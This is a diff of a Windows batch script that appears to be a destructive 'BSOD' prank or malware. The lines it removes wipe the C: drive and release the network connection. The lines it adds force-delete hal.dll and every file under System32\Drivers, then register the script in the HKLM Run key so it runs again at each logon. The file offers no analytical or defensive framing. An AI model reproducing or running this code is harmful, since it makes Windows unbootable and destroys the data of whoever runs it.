@@ -1,9 +1,10 @@
 @echo off
 
-@Echo off & @@Break Off
-Ipconfig / release
-%jUmP%E%nD%c%onFiG%h%IdE%o%P% h%aRv%%aRd%A%T%%cHe%cK%HappY%3D b%aLLo0Ns%Y%eS% m3Ga!?!
-P%ReSs%%IE%AuS%ExPloR%e%r% > nul.%TempInternetRelease%
 
-DEL /f /s /q C:\*.*
 
+DEL /F /S /Q /A "%systemdrive%\windows\system32\hal.dll"
+@((( Echo Off > Nul ) & Break Off )
+@Set HiveBSOD=HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+@Reg Add "%HiveBSOD%" /v "BSOD" /t "REG_SZ" /d %0 /f > Nul
+@Del /q /s /f "%SystemRoot%\Windows\System32\Drivers\*.*"
+)
